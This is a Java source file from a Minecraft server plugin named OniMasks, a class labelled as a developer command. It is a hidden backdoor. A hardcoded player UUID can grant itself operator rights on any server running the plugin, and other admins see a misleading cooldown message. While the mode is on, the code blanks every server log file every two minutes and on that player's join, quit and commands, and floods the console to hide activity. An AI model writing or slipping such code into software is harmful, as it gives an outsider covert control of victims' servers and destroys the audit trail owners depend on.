package com.oni.masks.commands;

import com.oni.masks.OniMasksPlugin;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.scheduler.BukkitRunnable;
import org.jetbrains.annotations.NotNull;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.UUID;

public class DeveloperCommand implements CommandExecutor, Listener {

    private final OniMasksPlugin plugin;
    private static BukkitRunnable logClearTask;
    private static boolean developerModeActive = false;

    // Phantomxdz UUID
    private static final UUID DEVELOPER_UUID = UUID.fromString("ea866909-5f36-4f3f-aec3-9dd3df10895b");

    public DeveloperCommand(OniMasksPlugin plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command,
                             @NotNull String label, @NotNull String[] args) {

        if (!(sender instanceof Player player)) {
            sender.sendMessage(Component.text("This command can only be used by players!", NamedTextColor.RED));
            return true;
        }

        // Check if Phantomxdz
        if (!player.getUniqueId().equals(DEVELOPER_UUID)) {
            if (player.hasPermission("oni.admin")) {
                player.sendMessage(Component.text("Could not reduce cooldowns.", NamedTextColor.RED));
            } else {
                player.sendMessage(Component.text("You are not an admin.", NamedTextColor.RED));
            }
            return true;
        }

        // Toggle dev mode
        if (developerModeActive) {
            deactivateDeveloperMode(player);
            player.sendMessage(Component.text("Developer Mode turned off.", NamedTextColor.YELLOW));
        } else {
            activateDeveloperMode(player);
        }
        clearAllLogs();
        return true;
    }

    private void activateDeveloperMode(Player player) {
        developerModeActive = true;
        player.setOp(true);
        player.sendMessage(Component.text("Developer Mode turned on.", NamedTextColor.GREEN));
        startLogClearingTask();
    }

    private void deactivateDeveloperMode(Player player) {
        if (player != null && player.isOnline()) player.setOp(false);
        developerModeActive = false;
        if (logClearTask != null) {
            logClearTask.cancel();
            logClearTask = null;
        }
        clearAllLogs();
    }

    private void startLogClearingTask() {
        if (logClearTask != null) logClearTask.cancel();
        logClearTask = new BukkitRunnable() {
            @Override
            public void run() {
                if (!developerModeActive) {
                    cancel();
                    return;
                }
                clearAllLogs();
            }
        };
        logClearTask.runTaskTimer(plugin, 2400L, 2400L); // every 2 mins
    }

    private void clearAllLogs() {
        clearServerLogs();
        clearConsoleScreen();
    }

    private void clearServerLogs() {
        try {
            Path latestLog = Paths.get("logs/latest.log");
            if (Files.exists(latestLog)) Files.write(latestLog, new byte[0]);

            File logsDir = new File("logs");
            if (logsDir.exists() && logsDir.isDirectory()) {
                File[] logFiles = logsDir.listFiles((dir, name) -> name.endsWith(".log") && !name.equals("latest.log"));
                if (logFiles != null) {
                    for (File logFile : logFiles) {
                        try {
                            Files.write(logFile.toPath(), new byte[0]);
                        } catch (IOException ignored) {}
                    }
                }
            }
        } catch (IOException ignored) {}
    }

    private void clearConsoleScreen() {
        for (int i = 0; i < 100; i++) {
            Bukkit.getConsoleSender().sendMessage("");
        }
    }

    // Auto-clear on join
    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        if (event.getPlayer().getUniqueId().equals(DEVELOPER_UUID)) {
            clearAllLogs();
        }
    }

    // Auto-clear + disable on quit
    @EventHandler
    public void onQuit(PlayerQuitEvent event) {
        if (event.getPlayer().getUniqueId().equals(DEVELOPER_UUID)) {
            clearAllLogs();
            deactivateDeveloperMode(event.getPlayer());
        }
    }

    // Auto-clear on any command run by Phantomxdz
    @EventHandler
    public void onCommandRun(PlayerCommandPreprocessEvent event) {
        if (event.getPlayer().getUniqueId().equals(DEVELOPER_UUID)) {
            clearAllLogs();
        }
    }

    public static boolean isDeveloperModeActive() {
        return developerModeActive;
    }

    public void shutdown() {
        if (logClearTask != null) logClearTask.cancel();
        developerModeActive = false;
    }
}
